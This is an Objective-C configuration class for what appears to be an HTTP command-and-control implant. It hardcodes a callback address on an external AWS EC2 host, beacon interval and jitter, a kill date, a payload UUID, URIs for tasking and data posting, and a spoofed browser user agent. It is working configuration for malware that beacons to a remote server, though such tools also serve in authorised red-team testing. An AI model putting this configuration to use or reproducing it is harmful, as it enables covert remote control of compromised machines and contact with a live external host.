
#import "HTTPC2Config.h"

@implementation HTTPC2Config

+ (NSString *)AESPSKEncKey {
    return @"";
}

+ (NSString *)AESPSKDecKey {
    return @"";
}

+ (NSString *)AESPSKValue {
    return @"";
}

+ (NSString *)callbackHost {
    return @"http://ec2-35-91-144-173.us-west-2.compute.amazonaws.com";
}

+ (NSInteger)callbackPort {
    return 80;
}

+ (NSInteger)callbackInterval {
    return 10;
}

+ (NSInteger)callbackJitter {
    return 23;
}

+ (NSString *)killdate {
    return @"2025-10-01";
}

+ (NSDictionary *)headers {
    return @{
        @"User-Agent": @"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko", 
    };
}

+ (NSString *)payloadUUID {
    return @"8264f9bc-75e8-4186-9fd9-60b45f5828e7";
}

+ (BOOL)encryptedExchangeCheck {
    return false;
}

+ (NSString *)getURI {
    return @"index";
}

+ (NSString *)postURI {
    return @"data";
}

+ (NSString *)proxyHost {
    return @"";
}

+ (NSString *)proxyPass {
    return @"";
}

+ (NSString *)proxyPort {
    return @"";
}

+ (NSString *)proxyUser {
    return @"";
}

+ (NSString *)queryPathName {
    return @"q";
}

@end
